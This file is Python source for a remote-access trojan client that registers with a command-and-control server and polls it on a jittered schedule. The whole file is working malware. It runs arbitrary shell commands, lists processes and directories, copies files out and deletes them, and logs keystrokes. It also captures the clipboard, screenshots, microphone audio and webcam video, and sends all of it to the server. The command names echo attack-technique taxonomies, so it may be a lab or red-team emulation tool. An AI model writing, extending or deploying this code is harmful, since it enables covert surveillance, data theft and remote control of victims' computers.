import requests
import platform
import socket
import time
import subprocess
import json
import base64
import os
import sys
import psutil
import keyboard
import pyperclip
from PIL import ImageGrab
import wave
import cv2
from io import BytesIO
import sounddevice as sd
import datetime


class Client:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = None
        self.hostname = socket.gethostname()
        self.os = platform.system()

    def _respond(self, command_id, output, file=None, encode=True, input_bytes=False, file_format='dat'):
        
        if file and encode:
            file = base64.b64encode(file.encode()).decode()
        elif file and input_bytes:
            file = base64.b64encode(file).decode()

        requests.post(
            f"{self.server_url}/result/{command_id}",
            json={'output': output, 'file' : file, 'format' : file_format}
        )

    def register(self):
        try:
            response = requests.post(
                f"{self.server_url}/register",
                json={
                    'hostname': self.hostname,
                    'os': self.os
                }
            )
            if response.status_code == 200:
                self.client_id = response.json()['client_id']
                return True
        except Exception as e:
            print(e)
        return False

    def heartbeat(self):
        try:
            response = requests.post(
                f"{self.server_url}/heartbeat/{self.client_id}"
            )
            if response.status_code == 200:
                commands = response.json().get('commands', [])
                for cmd_id, cmd_data in commands:
                    self.check_command(cmd_id, cmd_data)
        except Exception as e:
            print(e)

    def execute_command(self, command):
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            stdout, stderr = process.communicate()
            output = stdout.decode() if stdout else stderr.decode()

            return output
        except Exception as e:
            print(e)

    def run(self):
        if not self.register():
            return

        jitter = [6,2,-7,3,9,6,2,7,-5,7,6,-9,0,1]
    
        while True:
            for i in jitter:
                self.heartbeat()
                time.sleep(30+i) 



    def check_command(self, command_id, command_data):
        command_name = command_data['command_type']
        print(command_data['str'])
        if command_name == "system_info":
            output = []
            output.append(self.execute_command(command_data['str']))
            
        elif command_name == "command_line":
            output = self.execute_command(command_data['str'])
            self._respond(command_id, output)
            
        elif command_name == "file_directory_discovery":
            output = self.execute_command('dir')
            self._respond(command_id, output)
            
        elif command_name == "remote_file_copy":
            file_path = command_data['str']
            if not os.path.exists(file_path):
                self._respond(command_id, 'fail')
                return
            if not os.path.isfile(file_path):
                self._respond(command_id, 'fail')
                return
            with open(file_path, "r") as file:
                contents = file.read()
            self._respond(command_id, 'success', contents)

        elif command_name == "file_deletion":
            file_path = command_data['str']
            if not os.path.exists(file_path):
                self._respond(command_id, 'fail')
                return
            if not os.path.isfile(file_path):
                self._respond(command_id, 'fail')
                return
            os.remove(file_path)
            self._respond(command_id, 'success')

            
        elif command_name == "process_discovery":
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                processes.append(str(proc.info))
            res = {'res' : processes}
            res = json.dumps(res)
            return self._respond(command_id, res)
            
        elif command_name == "input_capture":
            recorded_keys = []
            def callback(event):
                recorded_keys.append(event.name)
                
            keyboard.on_press(callback)
            time.sleep(10)  # Record for 10 seconds
            keyboard.unhook_all()
                
            return self._respond(command_id, recorded_keys)
            
        elif command_name == "clipboard_data":
            clipboard_content = pyperclip.paste()
            return self._respond(command_id, clipboard_content)
                
        elif command_name == "screen_capture":
            screenshot = ImageGrab.grab()
            with BytesIO() as bio:
                screenshot.save(bio, format='PNG')
                encoded_image = base64.b64encode(bio.getvalue())
            return self._respond(command_id, "success", encoded_image.decode(), encode=False, file_format='png')

                
        elif command_name == "audio_capture":
            
            filename = 'temp.wav'
            duration = 10
            samplerate = 44100
            recording = sd.rec(
                frames=int(duration * samplerate),
                samplerate=samplerate, 
                channels=2,
                dtype='int16'
            )
            sd.wait()
            
            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(samplerate)
                wf.writeframes(recording.tobytes())
            
            content = None
            with open(filename, 'rb') as file:
                content = file.read()
            
            os.remove(filename)
            return self._respond(command_id, 'success', content, encode=False, input_bytes=True, file_format='wav')


        elif command_name == "video_capture":
            try:
                cap = cv2.VideoCapture(0)
                filename = f"video.avi"
                
                fourcc = cv2.VideoWriter_fourcc(*'XVID')
                out = cv2.VideoWriter(filename, fourcc, 20.0, (640,480))
                
                start_time = time.time()
                duration = 10  # seconds
                
                while(time.time() - start_time < duration):
                    ret, frame = cap.read()
                    if ret:
                        out.write(frame)
                
                cap.release()
                out.release()
                
                content = None
                with open(filename, 'rb') as file:
                    content = file.read()
                
                os.remove(filename)
                return self._respond(command_id, 'success', content, encode=False, input_bytes=True, file_format='avi')
            except Exception as e:
                print(e)
                return self._respond(command_id, "fail")
        else:
            print(f"Unknown command: {command_id}")



if __name__ == '__main__':
    SERVER_URL = 'http://192.168.73.137:5000' 
    client = Client(SERVER_URL)
    client.run()